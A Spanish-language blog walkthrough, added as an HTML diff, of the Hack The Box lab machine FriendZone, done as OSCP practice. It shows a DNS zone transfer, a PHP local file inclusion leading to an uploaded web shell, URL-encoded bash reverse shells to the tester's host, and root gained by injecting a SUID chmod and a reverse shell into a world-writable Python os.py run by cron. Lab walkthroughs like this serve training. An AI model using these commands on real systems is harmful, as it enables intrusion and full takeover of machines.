@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>OSCP Path ~ FriendZone Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="OSCP Path ~ FriendZone Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Writeup de la maquina de HackTheBox llamada FRIENDZONE siguiendo el PATH para el OSCP" />
+<meta property="og:description" content="Writeup de la maquina de HackTheBox llamada FRIENDZONE siguiendo el PATH para el OSCP" />
+<link rel="canonical" href="http://localhost:4000/2021/08/10/FriendZone.html" />
+<meta property="og:url" content="http://localhost:4000/2021/08/10/FriendZone.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-10T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="OSCP Path ~ FriendZone Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2021-08-10T00:00:00-03:00","datePublished":"2021-08-10T00:00:00-03:00","description":"Writeup de la maquina de HackTheBox llamada FRIENDZONE siguiendo el PATH para el OSCP","headline":"OSCP Path ~ FriendZone Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/08/10/FriendZone.html"},"url":"http://localhost:4000/2021/08/10/FriendZone.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">OSCP Path ~ FriendZone Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/OSCP/">OSCP</a>
+      
+      <a class="tag" href="/tag/Path,/">Path,</a>
+      
+      <a class="tag" href="/tag/Transferencia/">Transferencia</a>
+      
+      <a class="tag" href="/tag/de/">de</a>
+      
+      <a class="tag" href="/tag/Zona,/">Zona,</a>
+      
+      <a class="tag" href="/tag/Multiples/">Multiples</a>
+      
+      <a class="tag" href="/tag/Dominios,/">Dominios,</a>
+      
+      <a class="tag" href="/tag/CRON,/">CRON,</a>
+      
+      <a class="tag" href="/tag/LFI,/">LFI,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Writeup,/">Writeup,</a>
+      
+      <a class="tag" href="/tag/Hacking/">Hacking</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 10 Aug 2021</div>
+  
+  <noscript>
+    <div class="post-description">Writeup de la maquina de HackTheBox llamada FRIENDZONE siguiendo el PATH para el OSCP</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="friendzone--hack-the-box-to-oscp">FriendZone ~ Hack The Box to OSCP</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.123       "</span>
+</code></pre></div></div>
+<p>Procedemos con el siguiente escaneo de Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b <span class="o">(</span>ED25519<span class="o">)</span>
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Friend Zone Escape software
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: 404 Not Found
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span><span class="s2">" friendzone.red "</span>/organizationName<span class="o">=</span>CODERED/stateOrProvinceName<span class="o">=</span>CODERED/countryName<span class="o">=</span>JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn: 
+|_  http/1.1
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+Service Info: Hosts: FRIENDZONE, 127.0.1.1<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: <span class="nt">-48m13s</span>, deviation: 1h43m55s, median: 11m46s
+|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.7.6-Ubuntu<span class="o">)</span>
+|   Computer name: friendzone
+|   NetBIOS computer name: FRIENDZONE<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: friendzone
+|_  System <span class="nb">time</span>: 2021-08-05T19:22:45+03:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-08-05T16:22:45
+|_  start_date: N/A
+</code></pre></div></div>
+<p>Lanzamos el script <code class="language-plaintext highlighter-rouge">http-enum</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>80/tcp  open  http
+| http-enum: 
+|   /wordpress/: Blog
+|_  /robots.txt: Robots fil
+</code></pre></div></div>
+<p>Lanzamos la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.123: <span class="o">[</span>200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.123], Title[Friend Zone Escape software]
+</code></pre></div></div>
+
+<p>Procedemos a enumera el servicio <code class="language-plaintext highlighter-rouge">SMB</code> con la herramienta <code class="language-plaintext highlighter-rouge">smbclient</code> &amp; <code class="language-plaintext highlighter-rouge">smbmap</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbclient -L 10.10.10.123 -N                                                                                                                                                                            </span>
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        print<span class="nv">$ </span>         Disk      Printer Drivers
+        Files           Disk      FriendZone Samba Server Files /etc/Files
+        general         Disk      FriendZone Samba Server Files
+        Development     Disk      FriendZone Samba Server Files
+        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>FriendZone server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -H 10.10.10.123                                                                                                                                                                                      1 ⚙
+[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
+        general                                                 READ ONLY       FriendZone Samba Server Files
+        Development                                             READ, WRITE     FriendZone Samba Server Files
+        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
+</code></pre></div></div>
+
+<p>Procedemos a intentar conectarnos a la maquina victima por el servicio <code class="language-plaintext highlighter-rouge">SMB</code> con <code class="language-plaintext highlighter-rouge">smbclient</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbclient //10.10.10.123/general -N                                                                                                                                                                     1 ⨯ 1 ⚙</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Jan 16 21:10:51 2019
+  ..                                  D        0  Wed Jan 23 22:51:02 2019
+  creds.txt                           N       57  Wed Oct 10 01:52:42 2018
+
+                9221460 blocks of size 1024. 6460368 blocks available
+smb: <span class="se">\&gt;</span> binary
+binary: <span class="nb">command </span>not found
+smb: <span class="se">\&gt;</span> get creds.txt 
+getting file <span class="se">\c</span>reds.txt of size 57 as creds.txt <span class="o">(</span>0,1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0,1 KiloBytes/sec<span class="o">)</span>
+</code></pre></div></div>
+<p>Encontramos un archivo <code class="language-plaintext highlighter-rouge">.txt</code> con credenciales que no sabemos para que sirven.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat creds.txt        </span>
+creds <span class="k">for </span>the admin THING:
+
+admin:WORKWORKHhallxxxxxxxx
+</code></pre></div></div>
+
+<p>#Ataque de Transferencia de Zona
+Cuando tenemos el servicio <code class="language-plaintext highlighter-rouge">53 domain</code> abierto y un dominio potencial como el que habiamos visto antes <code class="language-plaintext highlighter-rouge">friendzone.red</code> procedemos con la herramienta <code class="language-plaintext highlighter-rouge">dig</code>
+A nivel de http por el puerto 80 habiamos detectado otro posible potencial dominio <code class="language-plaintext highlighter-rouge">frienzoneportal.red</code></p>
+
+<p>Incorporamos estos dos dominios a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<p>Procedemos a hacer un ataque de transferencia de zona</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># host -l friendzoneportal.red 10.10.10.123                                                                                                                                                                   1 ⚙</span>
+Using domain server:
+Name: 10.10.10.123
+Address: 10.10.10.123#53
+Aliases: 
+
+friendzoneportal.red has IPv6 address ::1
+friendzoneportal.red name server localhost.
+friendzoneportal.red has address 127.0.0.1
+admin.friendzoneportal.red has address 127.0.0.1
+files.friendzoneportal.red has address 127.0.0.1
+imports.friendzoneportal.red has address 127.0.0.1
+vpn.friendzoneportal.red has address 127.0.0.1
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># host -l friendzone.red 10.10.10.123                                                                                                                                                                         1 ⚙</span>
+Using domain server:
+Name: 10.10.10.123
+Address: 10.10.10.123#53
+Aliases: 
+
+friendzone.red has IPv6 address ::1
+friendzone.red name server localhost.
+friendzone.red has address 127.0.0.1
+administrator1.friendzone.red has address 127.0.0.1
+hr.friendzone.red has address 127.0.0.1
+uploads.friendzone.red has address 127.0.0.1
+</code></pre></div></div>
+<p>Incorporamos todos los dominios nuevos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"administrator1.friendzone.red
+hr.friendzone.red
+uploads.friendzone.red
+vpn.friendzoneportal.red
+files.friendzoneportal.red
+imports.friendzoneportal.red
+admin.friendzoneportal.red"</span>
+</code></pre></div></div>
+<p>Y procedemos a echar un vistazo a nivel de http. y https.
+Encontramos una pagina que muestra indicios de LFI.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://administrator1.friendzone.red//dashboard.php?image_id=a.jpg&amp;pagename=timestamp
+
+Final Access timestamp is 1628457816
+</code></pre></div></div>
+<p>LFI con Wrapper
+PHP de BASE 64</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://administrator1.friendzone.red//dashboard.php?image_id<span class="o">=</span>&amp;pagename<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>dashboard
+
+PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo<span class="o">=</span>
+</code></pre></div></div>
+<p>Decodeamos el archivo en base64</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
+
+//echo <span class="s2">"&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;"</span><span class="p">;</span>
+//echo <span class="s2">"&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;"</span><span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"&lt;title&gt;FriendZone Admin !&lt;/title&gt;"</span><span class="p">;</span>
+<span class="nv">$auth</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="o">[</span><span class="s2">"FriendZoneAuth"</span><span class="o">]</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="o">(</span><span class="nv">$auth</span> <span class="o">===</span> <span class="s2">"e7749d0f4b4da5d03e6e9196fd1d18f1"</span><span class="o">){</span>
+ <span class="nb">echo</span> <span class="s2">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+
+<span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;"</span><span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;"</span><span class="p">;</span>
+
+<span class="k">if</span><span class="o">(!</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">"image_id"</span><span class="o">])){</span>
+  <span class="nb">echo</span> <span class="s2">"&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;image_name param is missed !&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+  <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;please enter it to show the image&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+  <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;default is image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+ <span class="o">}</span><span class="k">else</span><span class="o">{</span>
+ <span class="nv">$image</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s2">"image_id"</span><span class="o">]</span><span class="p">;</span>
+ <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;img src='images/</span><span class="nv">$image</span><span class="s2">'&gt;&lt;/center&gt;"</span><span class="p">;</span>
+
+ <span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;h1&gt;Something went worng ! , the script include wrong param !&lt;/h1&gt;&lt;/center&gt;"</span><span class="p">;</span>
+ include<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">"pagename"</span><span class="o">]</span>.<span class="s2">".php"</span><span class="o">)</span><span class="p">;</span>
+ //echo <span class="nv">$_GET</span><span class="o">[</span><span class="s2">"pagename"</span><span class="o">]</span><span class="p">;</span>
+ <span class="o">}</span>
+<span class="o">}</span><span class="k">else</span><span class="o">{</span>
+<span class="nb">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;You can't see the content ! , please login !&lt;/center&gt;&lt;/p&gt;"</span><span class="p">;</span>
+<span class="o">}</span>
+?&gt;
+</code></pre></div></div>
+<p>Procedemos a intentar subir un archivo al servicio SMB ya que habiamos averiguado la ruta en la que se almacenaban los archivo era <code class="language-plaintext highlighter-rouge">/etc/</code>
+Para seguidamente desde el LFI que hemos encontrado proceder a ejecutar comandos apuntando a la web-shell que vamos a subir.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ponemos un archivo php para causar un webshell al apuntarla desde el LFI  
+<span class="c"># smbclient -N //10.10.10.123/Development                                                                                                                                                                    1 ⚙</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> put shell.php
+putting file shell.php as <span class="se">\s</span>hell.php <span class="o">(</span>0,1 kb/s<span class="o">)</span> <span class="o">(</span>average 0,1 kb/s<span class="o">)</span>
+smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
+</code></pre></div></div>
+
+<p>Payload pa entrar y ganar acceso como www-data</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://administrator1.friendzone.red/dashboard.php?image_id<span class="o">=</span>&amp;pagename<span class="o">=</span>/etc/Development/shell&amp;cmd<span class="o">=</span>%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%32%34%31%2f%34%34%33%20%30%3e%26%31%27
+</code></pre></div></div>
+<p>Recibimos la conexion como <code class="language-plaintext highlighter-rouge">www-data</code> correctamente</p>
+
+<h1 id="escalando-privilegios">Escalando Privilegios</h1>
+<p>Procedemos con el usuario <code class="language-plaintext highlighter-rouge">www-data</code> a enumerar el sistema. 
+Nos movemos a nivel de directorios para la ruta <code class="language-plaintext highlighter-rouge">/var/www/</code>
+Encontramos este archivo de configuracion con las credenciales de el servicio MySQL.</p>
+
+<p>creds en mysql archivo .conf</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@FriendZone:/var/www<span class="nv">$ </span><span class="nb">cat </span>mysql_data.conf 
+<span class="k">for </span>development process this is the mysql creds <span class="k">for </span>user friend
+
+<span class="nv">db_user</span><span class="o">=</span> friend
+<span class="nv">db_pass</span><span class="o">=</span> Agpyu12!0.213<span class="err">$</span>
+<span class="nv">db_name</span><span class="o">=</span> FZ
+</code></pre></div></div>
+<p>Comprobamos si son Validas para SSH
+Conseguimos acceso como el usuario <code class="language-plaintext highlighter-rouge">friend</code>. Procedemos con la enumeracion a nivel de sistema para el usuario <code class="language-plaintext highlighter-rouge">friend</code>.</p>
+
+<p>encontramos en la ruta /opt/</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lR</span>
+.:
+total 4
+drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin
+
+./server_admin:
+total 4
+<span class="nt">-rwxr--r--</span> 1 root root 424 Jan 16  2019 reporter.py
+</code></pre></div></div>
+<p>Procedemos a enumerar con el script <code class="language-plaintext highlighter-rouge">pspy32s</code>  para localizar si se esta ejecutando alguna tarea CRON</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2021/08/10 15:49:03 CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>1170   | ./pspy32s 
+2021/08/10 15:49:03 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>115    | 
+2021/08/10 15:49:03 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1146   | 
+2021/08/10 15:49:03 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>11     | 
+2021/08/10 15:49:03 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1065   | 
+2021/08/10 15:49:03 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>10     | 
+2021/08/10 15:49:03 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1      | /sbin/init splash 
+2021/08/10 15:50:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1181   | /usr/bin/python /opt/server_admin/reporter.py 
+2021/08/10 15:50:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1180   | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
+2021/08/10 15:50:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>1179   | /usr/sbin/CRON <span class="nt">-f</span>
+</code></pre></div></div>
+<p>Vemos que es lo que hace el script <code class="language-plaintext highlighter-rouge">reporter.py</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin<span class="nv">$ </span><span class="nb">cat </span>reporter.py 
+<span class="c">#!/usr/bin/python</span>
+
+import os
+
+to_address <span class="o">=</span> <span class="s2">"admin1@friendzone.com"</span>
+from_address <span class="o">=</span> <span class="s2">"admin2@friendzone.com"</span>
+
+print <span class="s2">"[+] Trying to send email to %s"</span>%to_address
+
+<span class="c">#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''</span>
+
+<span class="c">#os.system(command)</span>
+
+<span class="c"># I need to edit the script later</span>
+<span class="c"># Sam ~ python developer</span>
+</code></pre></div></div>
+<p>Lo unico que vemos relevante es que usa la libreria OS de python, asique vamos a inspeccionar si tenemos permisos en alguna de las librerias</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/usr/lib<span class="nv">$ </span>find /usr <span class="nt">-name</span> os.py <span class="nt">-ls</span> 2&gt;/dev/null
+   134708     40 <span class="nt">-rw-r--r--</span>   1 root     root        37526 Sep 12  2018 /usr/lib/python3.6/os.py
+   282643     28 <span class="nt">-rwxrwxrwx</span>   1 root     root        25910 Jan 15  2019 /usr/lib/python2.7/os.py
+</code></pre></div></div>
+<p>Podemos modificar la libreria de python2.7/os.py al tener permisos de escritura asi cuando la tarea cron ejecute el script 
+procedera a ejecutarnos nuestros comandos escritos en el mismo archivo al final.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/lib/python2.7/os.py
+<span class="nt">-rwxrwxrwx</span> 1 root root 26014 Aug 10 16:20 /usr/lib/python2.7/os.py
+</code></pre></div></div>
+<p>Introducimos estos comandos en la os.py</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system("bash -c 'chmod 4755 /bin/bash'")
+system("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.241/443 0&gt;&amp;1'")
+</code></pre></div></div>
+<p>Procedemos a ponernos a la escucha por el puerto 443 con una session de netcat</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(root💀pro)-[/home/…/HTB/OSCP/FriendZone/nmap]
+└─# nc -vlnp 443                                                                                 130 ⨯
+listening on [any] 443 ...
+connect to [10.10.16.111] from (UNKNOWN) [10.10.10.123] 44500
+bash: cannot set terminal process group (1331): Inappropriate ioctl for device
+bash: no job control in this shell
+root@FriendZone:~# whoami
+whoami
+root
+root@FriendZone:~# cat /root/root.txt
+cat /root/root.txt
+b0e6c60b82cf96e9855ac1xxxxxxxxxxxx
+root@FriendZone:~# 
+</code></pre></div></div>
+
+<p>Maquina Rooteada =D !! Seguimos Full Hack</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/08/10/FriendZone.html';
+     this.page.identifier = '/2021/08/10/FriendZone';
+     this.page.title = 'OSCP Path ~ FriendZone Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2023/09/29/Buff-Bof.html">
+            Maquina  Retirada Buff de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Attacktive-THM-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
